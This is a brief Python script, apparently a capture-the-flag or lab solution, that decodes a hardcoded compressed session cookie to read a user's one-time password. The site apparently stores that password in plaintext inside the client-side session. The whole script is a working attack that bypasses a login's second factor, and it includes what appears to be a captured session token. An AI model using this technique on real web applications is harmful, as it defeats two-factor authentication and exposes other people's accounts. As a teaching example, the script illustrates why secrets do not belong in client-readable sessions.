import zlib
import base64

#Load up the cookie you get from the website after you login
#keep in mind that OTP codes expire after some time therefore be sure to copy the latest cookie for this to work

cookie_data = "eJwty0sKgCAQANC7zFpCDRS9TEhOIvjDmVbR3XPR9sF7oPSUMIKHKxRCENB5HITnRF64K2t-41yRONQBXllrpHNO6k1paZR2Am7C2ULFlUKsucH7AUWJHFs.ad0iPg.Q6u-H_o3nOdUvAEdl8eEiV-TK5Q"

# decoding with base64 and decompress with zlib
decoded = base64.urlsafe_b64decode(cookie_data + "==")
decompressed = zlib.decompress(decoded)

#we now print the final result, this should have averything in plaintext therefore you can see the OTP code for the specific user.
print(decompressed.decode())
